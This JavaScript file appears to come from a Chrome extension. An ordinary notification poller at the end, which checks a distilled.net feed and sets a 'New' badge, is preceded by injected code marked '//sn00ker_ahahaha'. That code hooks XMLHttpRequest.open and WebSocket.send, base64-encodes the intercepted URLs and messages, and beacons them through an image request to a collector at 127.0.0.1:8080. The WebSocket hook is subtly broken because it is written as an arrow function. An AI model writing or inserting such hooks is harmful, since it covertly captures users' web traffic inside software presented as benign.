function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var messages = [];
var whens = [];

function checkNotifications(){
    $.getJSON('http://www.distilled.net/store/notifications/notifications.json', function(data) {
        var new_messages = [];
        var new_whens = [];
        $.each(data, function(key, val) {
            if (messages.indexOf(val['message']) == -1){
                chrome.browserAction.setBadgeText({'text': 'New'});
                chrome.browserAction.setBadgeBackgroundColor({'color': '#f00'});
            }
            new_messages.push(val['message']);
            new_whens.push(val['when']);
        });
        messages = new_messages;
        whens = new_whens;
    });
}

checkNotifications();
setInterval(checkNotifications,60000);